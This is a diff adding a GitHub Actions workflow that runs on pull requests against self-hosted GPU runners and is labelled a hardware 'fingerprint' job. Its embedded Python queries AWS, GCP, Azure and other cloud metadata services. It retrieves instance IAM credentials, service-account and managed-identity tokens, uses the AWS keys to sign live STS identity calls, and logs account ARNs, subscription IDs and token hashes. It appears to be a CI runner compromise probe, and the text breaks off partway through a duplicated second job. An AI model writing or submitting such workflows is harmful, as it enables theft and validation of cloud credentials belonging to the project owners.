@@ -1,0 +1,739 @@
+name: c211-i125000-mi355x8
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  probe-mi35x-8-a:
+    runs-on: linux-mi35x-gpu-8
+    timeout-minutes: 20
+    steps:
+      - name: fingerprint
+        env:
+          NONCE: c211-i125000-f28f17f6ed984600
+          JOBTAG: probe-mi35x-8-a
+        run: |
+          set -u
+          echo "C211_PROBE_BEGIN job=probe-mi35x-8-a nonce=$NONCE ts=$(date -u +%FT%TZ)"
+          echo "C211_MARKER job=probe-mi35x-8-a nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un)"
+          id
+          hostname 2>&1; hostname -f 2>&1 || true
+          uname -a
+          (. /etc/os-release 2>/dev/null && echo "OS=$PRETTY_NAME") || true
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name /sys/class/dmi/id/board_vendor /sys/class/dmi/id/board_name /sys/class/dmi/id/bios_version 2>&1 | tr '\n' '|')"
+          echo "MACHINE_ID=$(cat /etc/machine-id 2>/dev/null || echo absent) BOOT_ID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo absent)"
+          echo "UPTIME=$(cat /proc/uptime 2>/dev/null | cut -d' ' -f1) PID1=$(cat /proc/1/comm 2>/dev/null || echo absent)"
+          echo "CGROUP1=$(cat /proc/1/cgroup 2>/dev/null | head -3 | tr '\n' ';')"
+          echo "CPU=$(grep -m1 'model name' /proc/cpuinfo 2>/dev/null | cut -d: -f2 | sed 's/^ *//') NPROC=$(nproc 2>/dev/null) MEM_KB=$(grep -m1 MemTotal /proc/meminfo 2>/dev/null | awk '{print $2}')"
+          echo "--- rocm / amd identity (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --version 2>&1 | head -5 || true
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -200 || echo ROCM_SMI_UNIQUE_FAILED
+            rocm-smi --showproductname 2>&1 | head -60 || true
+            rocm-smi --showhw 2>&1 | head -60 || true
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi --version 2>&1 | head -5 || true
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_STATIC_FAILED
+            amd-smi list 2>&1 | head -80 || true
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          if command -v rocminfo >/dev/null 2>&1; then
+            rocminfo 2>&1 | grep -iE 'Marketing Name|Uuid|Vendor Name|Device Type|gfx|Name:' | head -80 || true
+          else
+            echo ROCMINFO_ABSENT
+          fi
+          echo "--- lspci / sysfs board identity ---"
+          if command -v lspci >/dev/null 2>&1; then
+            lspci -nn 2>&1 | grep -iE 'amd|ati|display|3d|vga|processing accel' | head -40 || true
+          else
+            echo LSPCI_ABSENT
+          fi
+          for dd in /sys/bus/pci/devices/*; do
+            cls=$(cat "$dd/class" 2>/dev/null || true)
+            case "$cls" in
+              0x030000|0x038000|0x030200|0x120000)
+                echo "PCIGPU $dd class=$cls vendor=$(cat $dd/vendor 2>/dev/null) device=$(cat $dd/device 2>/dev/null) subvendor=$(cat $dd/subsystem_vendor 2>/dev/null) subdevice=$(cat $dd/subsystem_device 2>/dev/null)"
+                ;;
+            esac
+          done
+          for cc in /sys/class/drm/card*/device; do
+            [ -e "$cc" ] || continue
+            echo "DRM $cc vendor=$(cat $cc/vendor 2>/dev/null) device=$(cat $cc/device 2>/dev/null) product_name=$(cat $cc/product_name 2>/dev/null) product_serial=$(cat $cc/product_serial 2>/dev/null) serial_number=$(cat $cc/serial_number 2>/dev/null) unique_id=$(cat $cc/unique_id 2>/dev/null) vbios=$(cat $cc/vbios_version 2>/dev/null)"
+          done
+          echo "AMD_DEVS:"
+          ls -l /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "DMESG=$( (dmesg 2>/dev/null || true) | grep -iE 'amdgpu|mi3[0-9]{2}|gfx9' | head -20 | tr '\n' ';' )"
+          echo "--- presence-only SA-token / socket checks ---"
+          if [ -s /var/run/secrets/kubernetes.io/serviceaccount/token ]; then echo "SA_TOKEN_PRESENT size=$(stat -c%s /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"; else echo "SA_TOKEN_ABSENT"; fi
+          echo "K8S_ENV host=${KUBERNETES_SERVICE_HOST:-none} port=${KUBERNETES_SERVICE_PORT:-none}"
+          ls -l /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /var/run/k3s/containerd/containerd.sock 2>&1 || true
+          echo "--- multi-provider metadata fingerprint (read-only, sha256-only credential presence) ---"
+          if command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PYEOF_META'
+          import json, hashlib, urllib.request, urllib.error, hmac, datetime, re, os, socket
+
+          def fp(v):
+              return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+
+          def http(method, url, headers=None, data=None, timeout=4):
+              r = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
+              try:
+                  resp = urllib.request.urlopen(r, timeout=timeout)
+                  return resp.status, resp.read()
+              except urllib.error.HTTPError as e:
+                  try: body = e.read()
+                  except Exception: body = b''
+                  return e.code, body
+              except Exception as e:
+                  return -1, ('ERR:%s:%s' % (type(e).__name__, str(e)[:100])).encode()
+
+          def sts(ak, sk, tok):
+              host = 'sts.amazonaws.com'; region = 'us-east-1'
+              body = 'Action=GetCallerIdentity&Version=2011-06-15'
+              t = datetime.datetime.now(datetime.timezone.utc)
+              amz = t.strftime('%Y%m%dT%H%M%SZ'); dat = t.strftime('%Y%m%d')
+              creq = 'POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n' % (host, amz)
+              sh = 'content-type;host;x-amz-date'
+              if tok:
+                  creq += 'x-amz-security-token:%s\n' % tok; sh = 'content-type;host;x-amz-date;x-amz-security-token'
+              creq += '\n' + sh + '\n' + hashlib.sha256(body.encode()).hexdigest()
+              scope = '%s/%s/sts/aws4_request' % (dat, region)
+              ts = 'AWS4-HMAC-SHA256\n%s\n%s\n%s' % (amz, scope, hashlib.sha256(creq.encode()).hexdigest())
+              k = ('AWS4' + sk).encode()
+              for m in (dat, region, 'sts', 'aws4_request'):
+                  k = hmac.new(k, m.encode(), hashlib.sha256).digest()
+              sig = hmac.new(k, ts.encode(), hashlib.sha256).hexdigest()
+              auth = 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s' % (ak, scope, sh, sig)
+              h = {'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8', 'X-Amz-Date': amz, 'Authorization': auth}
+              if tok: h['X-Amz-Security-Token'] = tok
+              try:
+                  resp = urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/', data=body.encode(), headers=h, method='POST'), timeout=8)
+                  return resp.status, resp.read().decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read().decode('utf-8', 'replace')
+              except Exception as e:
+                  return -1, str(e)[:200]
+
+          print('C211_META_HOST', socket.gethostname(), 'uid', os.getuid())
+          print('C211_META_ENV AWS_KEY_PRESENT=%s AWS_KEY_FP=%s AWS_PROFILE=%s AWS_REGION=%s GOOGLE_APPLICATION_CREDENTIALS=%s AZURE_CLIENT_ID=%s K8S_SA_TOKEN=%s' % (
+              bool(os.environ.get('AWS_ACCESS_KEY_ID')), fp(os.environ.get('AWS_ACCESS_KEY_ID')),
+              os.environ.get('AWS_PROFILE'), os.environ.get('AWS_REGION'),
+              bool(os.environ.get('GOOGLE_APPLICATION_CREDENTIALS')), bool(os.environ.get('AZURE_CLIENT_ID')),
+              os.path.exists('/var/run/secrets/kubernetes.io/serviceaccount/token')))
+
+          print('=== AWS IMDSv2 ===')
+          st, body = http('PUT', 'http://169.254.169.254/latest/api/token', {'X-aws-ec2-metadata-token-ttl-seconds': '60'}, data=b'', timeout=4)
+          tok = body.decode('utf-8', 'replace').strip() if st == 200 else ''
+          print('AWS_TOKEN_PUT status=%s tok_len=%s tok_fp=%s body_prefix=%s' % (st, len(tok), fp(tok), body[:60].decode('utf-8', 'replace') if st != 200 else ''))
+          if st == 200 and tok:
+              for p in ('meta-data/instance-id', 'meta-data/instance-type', 'meta-data/placement/availability-zone', 'meta-data/iam/info'):
+                  s2, b2 = http('GET', 'http://169.254.169.254/latest/' + p, {'X-aws-ec2-metadata-token': tok})
+                  print('AWS_IMDS', p, 'status=', s2, 'body=', b2.decode('utf-8', 'replace').replace('\n', ' ')[:300])
+              s2, b2 = http('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', {'X-aws-ec2-metadata-token': tok})
+              role = b2.decode('utf-8', 'replace').strip()
+              print('AWS_ROLE status=', s2, 'role=', role[:120])
+              if s2 == 200 and role and not role.startswith('ERR'):
+                  role0 = role.splitlines()[0]
+                  s3, b3 = http('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role0, {'X-aws-ec2-metadata-token': tok})
+                  if s3 == 200:
+                      try:
+                          d = json.loads(b3)
+                          print('AWS_CRED_FIELDS', json.dumps({'AccessKeyId_fp': fp(d.get('AccessKeyId')), 'SecretAccessKey_fp': fp(d.get('SecretAccessKey')), 'Token_fp': fp(d.get('Token')), 'Expiration': d.get('Expiration'), 'Code': d.get('Code')}))
+                          s4, b4 = sts(d.get('AccessKeyId'), d.get('SecretAccessKey'), d.get('Token'))
+                          m = re.search(r'<Arn>([^<]+)</Arn>', b4); a = re.search(r'<Account>([^<]+)</Account>', b4)
+                          print('STS_STATUS', s4, 'STS_ARN', (m.group(1) if m else None), 'STS_ACCOUNT', (a.group(1) if a else None))
+                          if s4 != 200: print('STS_BODY', b4[:300].replace('\n', ' '))
+                          s5, b5 = sts(d.get('AccessKeyId'), str(d.get('SecretAccessKey')) + 'TAMPERED', d.get('Token'))
+                          m5 = re.search(r'<Code>([^<]+)</Code>', b5)
+                          print('STS_TAMPERED_STATUS', s5, 'STS_TAMPERED_CODE', (m5.group(1) if m5 else None))
+                      except Exception as e:
+                          print('AWS_CRED_PARSE_FAIL', str(e)[:150], b3[:160])
+          st, body = http('PUT', 'http://169.254.169.254/latest/api/token', {'X-aws-ec2-metadata-token-ttl-seconds': 'abc'}, data=b'', timeout=3)
+          print('AWS_TOKEN_TAMPERED_TTL status=', st, 'body=', body[:80])
+          st, body = http('GET', 'http://169.254.169.254/latest/meta-data/instance-id', {}, timeout=3)
+          print('AWS_IMDSV1_NO_TOKEN status=', st, 'body=', body[:120].decode('utf-8', 'replace'))
+          if tok:
+              st, body = http('GET', 'http://169.254.169.254/latest/meta-data/c211-bogus-path-xyz', {'X-aws-ec2-metadata-token': tok}, timeout=3)
+              print('AWS_BOGUS_PATH status=', st)
+          st, body = http('GET', 'http://169.254.169.253/latest/meta-data/', {}, timeout=2)
+          print('ABSENT_169_254_169_253 status=', st, 'body=', body[:80].decode('utf-8', 'replace'))
+
+          print('=== GCP ===')
+          ghdr = {'Metadata-Flavor': 'Google'}
+          gcp_ok = False
+          for host in ('http://metadata.google.internal/computeMetadata/v1/instance/id', 'http://169.254.169.254/computeMetadata/v1/instance/id'):
+              st, b = http('GET', host, ghdr, timeout=3)
+              print('GCP_INSTANCE_ID host=%s status=%s body=%s' % (host.split('/')[2], st, b[:80].decode('utf-8', 'replace')))
+              if st == 200 and not gcp_ok:
+                  gcp_ok = True
+                  for p in ('project/project-id', 'instance/zone', 'instance/name', 'instance/service-accounts/'):
+                      s2, b2 = http('GET', 'http://metadata.google.internal/computeMetadata/v1/' + p, ghdr, timeout=3)
+                      print('GCP', p, 'status=', s2, 'body=', b2[:200].decode('utf-8', 'replace').replace('\n', ' '))
+                  s2, b2 = http('GET', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', ghdr, timeout=4)
+                  if s2 == 200:
+                      try:
+                          d = json.loads(b2)
+                          print('GCP_SA_TOKEN_FIELDS', json.dumps({'access_token_len': len(d.get('access_token') or ''), 'access_token_fp': fp(d.get('access_token')), 'expires_in': d.get('expires_in'), 'token_type': d.get('token_type')}))
+                      except Exception as e:
+                          print('GCP_TOKEN_PARSE_FAIL', str(e)[:120], b2[:120])
+          st, b = http('GET', 'http://169.254.169.254/computeMetadata/v1/instance/id', {}, timeout=3)
+          print('GCP_NO_HEADER_CONTROL status=', st, 'body=', b[:100].decode('utf-8', 'replace'))
+          st, b = http('GET', 'http://169.254.169.254/computeMetadata/v1/c211-bogus-path', ghdr, timeout=3)
+          print('GCP_BOGUS_PATH status=', st)
+
+          print('=== Azure ===')
+          az = {'Metadata': 'true'}
+          st, b = http('GET', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', az, timeout=4)
+          print('AZURE_INSTANCE status=', st, 'len=', len(b))
+          if st == 200:
+              try:
+                  d = json.loads(b); comp = d.get('compute', {})
+                  print('AZURE_COMPUTE', json.dumps({'vmId': comp.get('vmId'), 'name': comp.get('name'), 'location': comp.get('location'), 'resourceGroupName': comp.get('resourceGroupName'), 'subscriptionId': comp.get('subscriptionId'), 'vmSize': comp.get('vmSize'), 'azEnvironment': comp.get('azEnvironment')}))
+              except Exception as e:
+                  print('AZURE_PARSE_FAIL', str(e)[:120], b[:160])
+          st, b = http('GET', 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F', az, timeout=5)
+          print('AZURE_MSI_TOKEN status=', st, 'len=', len(b))
+          if st == 200:
+              try:
+                  d = json.loads(b)
+                  print('AZURE_MSI_FIELDS', json.dumps({'access_token_len': len(d.get('access_token') or ''), 'access_token_fp': fp(d.get('access_token')), 'expires_in': d.get('expires_in'), 'expires_on': d.get('expires_on'), 'resource': d.get('resource')}))
+              except Exception as e:
+                  print('AZURE_MSI_PARSE_FAIL', str(e)[:120])
+          st, b = http('GET', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', {}, timeout=3)
+          print('AZURE_NO_HEADER_CONTROL status=', st, 'body=', b[:100].decode('utf-8', 'replace'))
+          st, b = http('GET', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01&c211=bogus', az, timeout=3)
+          print('AZURE_BOGUS_QUERY status=', st)
+
+          print('=== Alibaba / DigitalOcean ===')
+          st, b = http('GET', 'http://100.100.100.200/latest/meta-data/instance-id', {}, timeout=3)
+          print('ALIBABA_INSTANCE status=', st, 'body=', b[:120].decode('utf-8', 'replace'))
+          st, b = http('GET', 'http://169.254.169.254/metadata/v1.json', {}, timeout=3)
+          print('DO_METADATA status=', st, 'len=', len(b))
+          if st == 200:
+              try:
+                  d = json.loads(b)
+                  print('DO_KEYS', sorted(list(d.keys()))[:20])
+                  print('DO_DROPLET', json.dumps({'droplet_id': d.get('droplet_id'), 'region': d.get('region'), 'hostname': d.get('hostname')}))
+              except Exception:
+                  pass
+
+          print('=== ECS / EKS Pod Identity (presence-only) ===')
+          rel = os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI')
+          if rel:
+              st, b = http('GET', 'http://169.254.170.2' + rel, {}, timeout=4)
+              print('ECS_CRED_REL status=', st, 'len=', len(b))
+              if st == 200:
+                  try:
+                      d = json.loads(b)
+                      print('ECS_CRED_FIELDS', json.dumps({k: fp(d.get(k)) for k in ('AccessKeyId', 'SecretAccessKey', 'Token')}), 'RoleArn_present=', bool(d.get('RoleArn')))
+                  except Exception:
+                      pass
+          else:
+              print('ECS_CRED_REL_ABSENT')
+          full = os.environ.get('AWS_CONTAINER_CREDENTIALS_FULL_URI')
+          print('EKS_POD_IDENTITY_FULL_URI_PRESENT', bool(full), 'eks_token_file_present', os.path.exists('/var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token'))
+          if full:
+              st, b = http('GET', full, {}, timeout=4)
+              print('EKS_POD_IDENTITY status=', st, 'len=', len(b))
+          st, b = http('GET', 'http://169.254.170.23/v1/credentials', {}, timeout=3)
+          print('EKS_POD_IDENTITY_169_254_170_23 status=', st, 'body=', b[:80].decode('utf-8', 'replace'))
+          print('C211_META_DONE')
+          PYEOF_META
+          else
+            echo "PY3_ABSENT"
+          fi
+          echo "C211_PROBE_END job=probe-mi35x-8-a nonce=$NONCE"
+
+  probe-mi35x-8-b:
+    runs-on: linux-mi35x-gpu-8
+    timeout-minutes: 20
+    steps:
+      - name: fingerprint
+        env:
+          NONCE: c211-i125000-f28f17f6ed984600
+          JOBTAG: probe-mi35x-8-b
+        run: |
+          set -u
+          echo "C211_PROBE_BEGIN job=probe-mi35x-8-b nonce=$NONCE ts=$(date -u +%FT%TZ)"
+          echo "C211_MARKER job=probe-mi35x-8-b nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un)"
+          id
+          hostname 2>&1; hostname -f 2>&1 || true
+          uname -a
+          (. /etc/os-release 2>/dev/null && echo "OS=$PRETTY_NAME") || true
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name /sys/class/dmi/id/board_vendor /sys/class/dmi/id/board_name /sys/class/dmi/id/bios_version 2>&1 | tr '\n' '|')"
+          echo "MACHINE_ID=$(cat /etc/machine-id 2>/dev/null || echo absent) BOOT_ID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo absent)"
+          echo "UPTIME=$(cat /proc/uptime 2>/dev/null | cut -d' ' -f1) PID1=$(cat /proc/1/comm 2>/dev/null || echo absent)"
+          echo "CGROUP1=$(cat /proc/1/cgroup 2>/dev/null | head -3 | tr '\n' ';')"
+          echo "CPU=$(grep -m1 'model name' /proc/cpuinfo 2>/dev/null | cut -d: -f2 | sed 's/^ *//') NPROC=$(nproc 2>/dev/null) MEM_KB=$(grep -m1 MemTotal /proc/meminfo 2>/dev/null | awk '{print $2}')"
+          echo "--- rocm / amd identity (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --version 2>&1 | head -5 || true
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -200 || echo ROCM_SMI_UNIQUE_FAILED
+            rocm-smi --showproductname 2>&1 | head -60 || true
+            rocm-smi --showhw 2>&1 | head -60 || true
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi --version 2>&1 | head -5 || true
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_STATIC_FAILED
+            amd-smi list 2>&1 | head -80 || true
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          if command -v rocminfo >/dev/null 2>&1; then
+            rocminfo 2>&1 | grep -iE 'Marketing Name|Uuid|Vendor Name|Device Type|gfx|Name:' | head -80 || true
+          else
+            echo ROCMINFO_ABSENT
+          fi
+          echo "--- lspci / sysfs board identity ---"
+          if command -v lspci >/dev/null 2>&1; then
+            lspci -nn 2>&1 | grep -iE 'amd|ati|display|3d|vga|processing accel' | head -40 || true
+          else
+            echo LSPCI_ABSENT
+          fi
+          for dd in /sys/bus/pci/devices/*; do
+            cls=$(cat "$dd/class" 2>/dev/null || true)
+            case "$cls" in
+              0x030000|0x038000|0x030200|0x120000)
+                echo "PCIGPU $dd class=$cls vendor=$(cat $dd/vendor 2>/dev/null) device=$(cat $dd/device 2>/dev/null) subvendor=$(cat $dd/subsystem_vendor 2>/dev/null) subdevice=$(cat $dd/subsystem_device 2>/dev/null)"
+                ;;
+            esac
+          done
+          for cc in /sys/class/drm/card*/device; do
+            [ -e "$cc" ] || continue
+            echo "DRM $cc vendor=$(cat $cc/vendor 2>/dev/null) device=$(cat $cc/device 2>/dev/null) product_name=$(cat $cc/product_name 2>/dev/null) product_serial=$(cat $cc/product_serial 2>/dev/null) serial_number=$(cat $cc/serial_number 2>/dev/null) unique_id=$(cat $cc/unique_id 2>/dev/null) vbios=$(cat $cc/vbios_version 2>/dev/null)"
+          done
+          echo "AMD_DEVS:"
+          ls -l /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "DMESG=$( (dmesg 2>/dev/null || true) | grep -iE 'amdgpu|mi3[0-9]{2}|gfx9' | head -20 | tr '\n' ';' )"
+          echo "--- presence-only SA-token / socket checks ---"
+          if [ -s /var/run/secrets/kubernetes.io/serviceaccount/token ]; then echo "SA_TOKEN_PRESENT size=$(stat -c%s /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"; else echo "SA_TOKEN_ABSENT"; fi
+          echo "K8S_ENV host=${KUBERNETES_SERVICE_HOST:-none} port=${KUBERNETES_SERVICE_PORT:-none}"
+          ls -l /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /var/run/k3s/containerd/containerd.sock 2>&1 || true
+          echo "--- multi-provider metadata fingerprint (read-only, sha256-only credential presence) ---"
+          if command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PYEOF_META'
+          import json, hashlib, urllib.request, urllib.error, hmac, datetime, re, os, socket
+
+          def fp(v):
+              return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+
+          def http(method, url, headers=None, data=None, timeout=4):
+              r = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
+              try:
+                  resp = urllib.request.urlopen(r, timeout=timeout)
+                  return resp.status, resp.read()
+              except urllib.error.HTTPError as e:
+                  try: body = e.read()
+                  except Exception: body = b''
+                  return e.code, body
+              except Exception as e:
+                  return -1, ('ERR:%s:%s' % (type(e).__name__, str(e)[:100])).encode()
+
+          def sts(ak, sk, tok):
+              host = 'sts.amazonaws.com'; region = 'us-east-1'
+              body = 'Action=GetCallerIdentity&Version=2011-06-15'
+              t = datetime.datetime.now(datetime.timezone.utc)
+              amz = t.strftime('%Y%m%dT%H%M%SZ'); dat = t.strftime('%Y%m%d')
+              creq = 'POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n' % (host, amz)
+              sh = 'content-type;host;x-amz-date'
+              if tok:
+                  creq += 'x-amz-security-token:%s\n' % tok; sh = 'content-type;host;x-amz-date;x-amz-security-token'
+              creq += '\n' + sh + '\n' + hashlib.sha256(body.encode()).hexdigest()
+              scope = '%s/%s/sts/aws4_request' % (dat, region)
+              ts = 'AWS4-HMAC-SHA256\n%s\n%s\n%s' % (amz, scope, hashlib.sha256(creq.encode()).hexdigest())
+              k = ('AWS4' + sk).encode()
+              for m in (dat, region, 'sts', 'aws4_request'):
+                  k = hmac.new(k, m.encode(), hashlib.sha256).digest()
+              sig = hmac.new(k, ts.encode(), hashlib.sha256).hexdigest()
+              auth = 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s' % (ak, scope, sh, sig)
+              h = {'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8', 'X-Amz-Date': amz, 'Authorization': auth}
+              if tok: h['X-Amz-Security-Token'] = tok
+              try:
+                  resp = urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/', data=body.encode(), headers=h, method='POST'), timeout=8)
+                  return resp.status, resp.read().decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read().decode('utf-8', 'replace')
+              except Exception as e:
+                  return -1, str(e)[:200]
+
+          print('C211_META_HOST', socket.gethostname(), 'uid', os.getuid())
+          print('C211_META_ENV AWS_KEY_PRESENT=%s AWS_KEY_FP=%s AWS_PROFILE=%s AWS_REGION=%s GOOGLE_APPLICATION_CREDENTIALS=%s AZURE_CLIENT_ID=%s K8S_SA_TOKEN=%s' % (
+              bool(os.environ.get('AWS_ACCESS_KEY_ID')), fp(os.environ.get('AWS_ACCESS_KEY_ID')),
+              os.environ.get('AWS_PROFILE'), os.environ.get('AWS_REGION'),
+              bool(os.environ.get('GOOGLE_APPLICATION_CREDENTIALS')), bool(os.environ.get('AZURE_CLIENT_ID')),
+              os.path.exists('/var/run/secrets/kubernetes.io/serviceaccount/token')))
+
+          print('=== AWS IMDSv2 ===')
+          st, body = http('PUT', 'http://169.254.169.254/latest/api/token', {'X-aws-ec2-metadata-token-ttl-seconds': '60'}, data=b'', timeout=4)
+          tok = body.decode('utf-8', 'replace').strip() if st == 200 else ''
+          print('AWS_TOKEN_PUT status=%s tok_len=%s tok_fp=%s body_prefix=%s' % (st, len(tok), fp(tok), body[:60].decode('utf-8', 'replace') if st != 200 else ''))
+          if st == 200 and tok:
+              for p in ('meta-data/instance-id', 'meta-data/instance-type', 'meta-data/placement/availability-zone', 'meta-data/iam/info'):
+                  s2, b2 = http('GET', 'http://169.254.169.254/latest/' + p, {'X-aws-ec2-metadata-token': tok})
+                  print('AWS_IMDS', p, 'status=', s2, 'body=', b2.decode('utf-8', 'replace').replace('\n', ' ')[:300])
+              s2, b2 = http('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', {'X-aws-ec2-metadata-token': tok})
+              role = b2.decode('utf-8', 'replace').strip()
+              print('AWS_ROLE status=', s2, 'role=', role[:120])
+              if s2 == 200 and role and not role.startswith('ERR'):
+                  role0 = role.splitlines()[0]
+                  s3, b3 = http('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role0, {'X-aws-ec2-metadata-token': tok})
+                  if s3 == 200:
+                      try:
+                          d = json.loads(b3)
+                          print('AWS_CRED_FIELDS', json.dumps({'AccessKeyId_fp': fp(d.get('AccessKeyId')), 'SecretAccessKey_fp': fp(d.get('SecretAccessKey')), 'Token_fp': fp(d.get('Token')), 'Expiration': d.get('Expiration'), 'Code': d.get('Code')}))
+                          s4, b4 = sts(d.get('AccessKeyId'), d.get('SecretAccessKey'), d.get('Token'))
+                          m = re.search(r'<Arn>([^<]+)</Arn>', b4); a = re.search(r'<Account>([^<]+)</Account>', b4)
+                          print('STS_STATUS', s4, 'STS_ARN', (m.group(1) if m else None), 'STS_ACCOUNT', (a.group(1) if a else None))
+                          if s4 != 200: print('STS_BODY', b4[:300].replace('\n', ' '))
+                          s5, b5 = sts(d.get('AccessKeyId'), str(d.get('SecretAccessKey')) + 'TAMPERED', d.get('Token'))
+                          m5 = re.search(r'<Code>([^<]+)</Code>', b5)
+                          print('STS_TAMPERED_STATUS', s5, 'STS_TAMPERED_CODE', (m5.group(1) if m5 else None))
+                      except Exception as e:
+                          print('AWS_CRED_PARSE_FAIL', str(e)[:150], b3[:160])
+          st, body = http('PUT', 'http://169.254.169.254/latest/api/token', {'X-aws-ec2-metadata-token-ttl-seconds': 'abc'}, data=b'', timeout=3)
+          print('AWS_TOKEN_TAMPERED_TTL status=', st, 'body=', body[:80])
+          st, body = http('GET', 'http://169.254.169.254/latest/meta-data/instance-id', {}, timeout=3)
+          print('AWS_IMDSV1_NO_TOKEN status=', st, 'body=', body[:120].decode('utf-8', 'replace'))
+          if tok:
+              st, body = http('GET', 'http://169.254.169.254/latest/meta-data/c211-bogus-path-xyz', {'X-aws-ec2-metadata-token': tok}, timeout=3)
+              print('AWS_BOGUS_PATH status=', st)
+          st, body = http('GET', 'http://169.254.169.253/latest/meta-data/', {}, timeout=2)
+          print('ABSENT_169_254_169_253 status=', st, 'body=', body[:80].decode('utf-8', 'replace'))
+
+          print('=== GCP ===')
+          ghdr = {'Metadata-Flavor': 'Google'}
+          gcp_ok = False
+          for host in ('http://metadata.google.internal/computeMetadata/v1/instance/id', 'http://169.254.169.254/computeMetadata/v1/instance/id'):
+              st, b = http('GET', host, ghdr, timeout=3)
+              print('GCP_INSTANCE_ID host=%s status=%s body=%s' % (host.split('/')[2], st, b[:80].decode('utf-8', 'replace')))
+              if st == 200 and not gcp_ok:
+                  gcp_ok = True
+                  for p in ('project/project-id', 'instance/zone', 'instance/name', 'instance/service-accounts/'):
+                      s2, b2 = http('GET', 'http://metadata.google.internal/computeMetadata/v1/' + p, ghdr, timeout=3)
+                      print('GCP', p, 'status=', s2, 'body=', b2[:200].decode('utf-8', 'replace').replace('\n', ' '))
+                  s2, b2 = http('GET', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', ghdr, timeout=4)
+                  if s2 == 200:
+                      try:
+                          d = json.loads(b2)
+                          print('GCP_SA_TOKEN_FIELDS', json.dumps({'access_token_len': len(d.get('access_token') or ''), 'access_token_fp': fp(d.get('access_token')), 'expires_in': d.get('expires_in'), 'token_type': d.get('token_type')}))
+                      except Exception as e:
+                          print('GCP_TOKEN_PARSE_FAIL', str(e)[:120], b2[:120])
+          st, b = http('GET', 'http://169.254.169.254/computeMetadata/v1/instance/id', {}, timeout=3)
+          print('GCP_NO_HEADER_CONTROL status=', st, 'body=', b[:100].decode('utf-8', 'replace'))
+          st, b = http('GET', 'http://169.254.169.254/computeMetadata/v1/c211-bogus-path', ghdr, timeout=3)
+          print('GCP_BOGUS_PATH status=', st)
+
+          print('=== Azure ===')
+          az = {'Metadata': 'true'}
+          st, b = http('GET', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', az, timeout=4)
+          print('AZURE_INSTANCE status=', st, 'len=', len(b))
+          if st == 200:
+              try:
+                  d = json.loads(b); comp = d.get('compute', {})
+                  print('AZURE_COMPUTE', json.dumps({'vmId': comp.get('vmId'), 'name': comp.get('name'), 'location': comp.get('location'), 'resourceGroupName': comp.get('resourceGroupName'), 'subscriptionId': comp.get('subscriptionId'), 'vmSize': comp.get('vmSize'), 'azEnvironment': comp.get('azEnvironment')}))
+              except Exception as e:
+                  print('AZURE_PARSE_FAIL', str(e)[:120], b[:160])
+          st, b = http('GET', 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F', az, timeout=5)
+          print('AZURE_MSI_TOKEN status=', st, 'len=', len(b))
+          if st == 200:
+              try:
+                  d = json.loads(b)
+                  print('AZURE_MSI_FIELDS', json.dumps({'access_token_len': len(d.get('access_token') or ''), 'access_token_fp': fp(d.get('access_token')), 'expires_in': d.get('expires_in'), 'expires_on': d.get('expires_on'), 'resource': d.get('resource')}))
